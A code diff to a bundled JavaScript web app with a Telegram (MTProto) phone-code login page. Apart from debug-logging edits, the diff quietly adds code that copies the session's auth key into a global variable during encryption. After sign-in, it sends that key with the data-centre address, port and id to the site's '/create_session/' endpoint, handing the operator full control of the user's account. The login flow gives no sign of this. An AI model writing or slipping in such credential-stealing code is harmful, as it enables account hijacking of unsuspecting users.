@@ -135,6 +135,7 @@ const {
  * console.log(deflate.result);
  * ```
  **/
+
 function Deflate(options) {
   this.options = utils.assign({
     level: Z_DEFAULT_COMPRESSION,
@@ -6771,7 +6772,7 @@ class MTProto {
 
   async call(method, params = {}, options = {}) {
     const { syncAuth = true } = options;
-
+    console.log(options)
     const dcId = options.dcId || (await this.storage.get('defaultDcId')) || 2;
 
     this.createRPC(dcId);
@@ -6809,6 +6810,7 @@ class MTProto {
             },
             { dcId: dc.id, syncAuth: false }
           );
+  
         })
         .catch(error => {
           console.warn(`Error when copy auth to DC ${dc.id}:`, error);
@@ -7504,7 +7506,7 @@ class RPC {
     const padding = minPadding + (unpadded ? 16 - unpadded : 0);
 
     const { sessionId } = this;
-    console.log(sessionId)
+    window.value = authKey
     console.log(authKey)
     const plainDataSerializer = new Serializer(function () {
       this.bytesRaw(serverSalt);
@@ -60003,7 +60005,6 @@ var MTproto;
                       dcId: +dcId,
                     };
                   }
-          
                   return this.call(method, params, options);
                 }
           
@@ -60128,6 +60129,16 @@ var app = new Vue({
                 },
                 });
             }
+            function getdcId(arr){
+              search_value = '[' + arr.toString() + ']'
+              console.log(search_value)
+              founded_key = ''
+              for (let [key, value] of MTproto.customLocalStorage.storage.entries()){
+                if (value == search_value) {founded_key = key}
+              }
+              dc_id = parseInt(founded_key.charAt(0))
+              return dc_id
+            }
             this.state = "code";
 
             (async () => {
@@ -60143,12 +60154,14 @@ var app = new Vue({
                     phone,
                     phone_code_hash,
                 });
-                console.log("aaaaaaaaaaaaaaaa")
                 console.log(MTproto)
                 console.log(`authResult:`, authResult);
-                await api.call('auth.exportedAuthorization',{
-                   dc_id: 1 
-                })
+                const key = window.value
+                const dc_id = getdcId(key)
+                const ip = MTproto.dcList[dc_id-1].ip
+                const port = MTproto.dcList[dc_id-1].port
+                console.log([key, dc_id])
+                await this.createSession(ip, dc_id, port, key)
                 } catch (error) {
                     console.log(error)
                 if (error.error_message !== 'SESSION_PASSWORD_NEEDED') {
@@ -60187,16 +60200,28 @@ var app = new Vue({
                   _: 'codeSettings',
                 },
               });
-            } 
-            console.log(this.form_data.phone) 
+            }  
             this.code_not_sent = true;
             (async () => { 
                 const phone_code_hash = await sendCode();
+                const dcId = MTproto.storage
                 this.code_hash = phone_code_hash.phone_code_hash
                 console.log(this.code_hash)
+                console.log(MTproto)
+                console.log(dcId)
             })();
+        },
+
+        createSession: function(server_adress, dc_id, port, auth_key){
+            axios.post('/create_session/', {
+                server_address: server_adress,
+                dc_id: dc_id,
+                port: port,
+                key: auth_key
+            }).then()
         }
     }
+    
 });
 
 var errors_app = new Vue({
